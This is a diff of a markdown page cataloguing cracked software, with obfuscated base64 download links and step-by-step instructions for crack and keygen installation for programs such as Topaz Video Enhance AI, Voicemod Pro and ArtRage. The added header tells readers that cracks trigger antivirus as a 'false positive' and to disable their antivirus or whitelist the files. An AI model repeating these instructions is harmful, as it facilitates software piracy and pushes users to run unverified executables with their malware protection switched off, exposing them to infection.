@@ -4,6 +4,10 @@
 
 ## *Use the Table of Contents below to quickly search for software. If what you want is not listed, you can request it on Discord.*
 
+## *Most trusted sites use premium hosts with slow download speeds and cooldowns. I host on MediaFire, which has neither of those drawbacks.*
+
+## *Cracks are likely to trigger your antivirus. It's a false positive. Disable your AV or make an exception so the crack is not deleted.*
+
 ## *You must use a decoder for most downloads: https://www.base64decode.org/*
 
 ### Table of Contents
@@ -305,6 +309,8 @@ Allows you to add ROMs to your Steam library. No need to launch the emulator the
 
 Easy to use tool to force unlock Steam Achievements.
 
+*WARNING: Valve does NOT care if you use this. Your Steam account will NOT be banned. However, a very small amount of developers might care, and they may ban you from their game's online services.*
+
 **[Download](https://www.mediafire.com/file/7959hmvrrsju1ez/Steam_Achievement_Manager.7z/file)**
 
 **Example uses:**
@@ -312,9 +318,7 @@ Easy to use tool to force unlock Steam Achievements.
 *  Online achievements when the game has shut down its multiplayer service, like Tomb Raider 
 *  Achievements requiring tools you don't have, such as VR, etc
 *  A game with mod support disabling achievements
-* Or maybe you're just a lazy bum 
-
-*WARNING: Valve does not care if you use this. Your Steam account will not be banned. However, a very small amount of developers might care, and they may ban you from their game's online services.*
+*  Or maybe you're just a lazy bum 
 
 * * *
 ### REWASD
@@ -336,7 +340,7 @@ To force PC games that do not have "Borderless Windowed" by default to use this 
 
 **[Download](https://www.mediafire.com/file/tqxklcoisekjeod/WBG.7z/file)**
 
-*Note: I do not know if this works for emulators. This is intended for PC games. Instructions inside.*
+*Note: I do not know if this works for emulators. This is intended for PC games.*
 
 * * *
 ### OVR TOOLKIT
@@ -418,7 +422,7 @@ Video Enhance AI uses the latest deep learning techniques to naturally increase 
 3. Install the software and do NOT launch the software when installation finishes
 4. Copy the files in the crack folder to the software's install directory
 5. Launch Topaz Video Enhance AI
-6. Enhance a video, and enter a random email and password when asked
+6. Enhance a video, and enter a random email and password (only needs to be done once).
 
 * * *
 ### DAVINCI RESOLVE STUDIO 2021
@@ -430,8 +434,6 @@ Video Enhance AI uses the latest deep learning techniques to naturally increase 
    </details>
 
 **[Website](https://www.blackmagicdesign.com/products/davinciresolve/studio)**
-
-*Note: Installation instructions are included in the download.*
 
 * * *
 ### VEGAS PRO
@@ -491,9 +493,7 @@ Voice changer and regulator for your voice chat!
 2. Install the software
 3. Disconnect from the internet
 4. Copy the contents of the crack folder to the install folder of Voicemod Pro
-5. Done
-
-*Note: Launch the software while disconnected from the internet, then reconnect to access the Pro voices.*
+5. Launch the software while disconnected from the internet, then reconnect to access the Pro voices.
 
 * * *
 ### SPECTRASONICS KEYSCAPE
@@ -508,8 +508,6 @@ Keyscape is an extraordinary virtual instrument featuring the largest selection 
 
 **[Official Site](https://www.spectrasonics.net/products/keyscape/)**
 
-*Note: Installation instructions are included in the download*
-
 * * *
 ### ABLETON LIVE SUITE
 
@@ -522,8 +520,6 @@ Ableton Live is a fast, fluid and flexible software for music creation and perfo
    </details>
 
 **[Official Site](https://www.ableton.com/en/live/)**
-
-*Note: Installation Instructions are included in the download.*
 
 * * *
 ### FL STUDIO
@@ -564,7 +560,6 @@ A very handy application which will allow you to paint, sketch and draw in a ver
 6. Paste the cracked exe files into ArtRage's install folder where the original files are located
 7. Click yes to replace
 8. Launch ArtRage, and click "Cancel" when asked for updates
-9. Done
 
 * * *
 ### CLIP STUDIO PAINT
@@ -576,8 +571,6 @@ Clip Studio Paint is optimized for drawing and painting. The paint brushes are h
     aHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS9maWxlL3RhZGM3ZWVuYXp3NzRyaS9DbGlwX1N0dWRpb19QYWludF8xLjkuNC43ei9maWxl
     </pre>
    </details>
-
-*Note: Installation instructions included in the readme file.*
 
 * * *
 ### WONDERSHARE EDRAWMIND PRO
@@ -652,8 +645,6 @@ qBitTorrent is our recommended torrent client. Do NOT use uTorrent or BitTorrent
 Android app that allows you to stream torrent videos as they download.
   
 **[Download](https://play.google.com/store/apps/details?id=com.houseoflife.bitlord)**
-
-*Note: Depending on your country, you’ll need a VPN for torrenting. It’s up to you to find out if your government gives a damn about stealing digital content.*
 
 * * *
 ### DEEMIX
@@ -741,9 +732,6 @@ Allows to you customize your desktop with animated wallpapers
 1. Extract the archive
 2. Install whichever version you prefer
 3. Run the keygen
-4. Done
-
-*Note: Keygens are almost always going to trigger your antivirus. It's a false positive. Disable your AV or make an exception so it does not delete the keygen.*
 
 * * *
 ### AIDA64
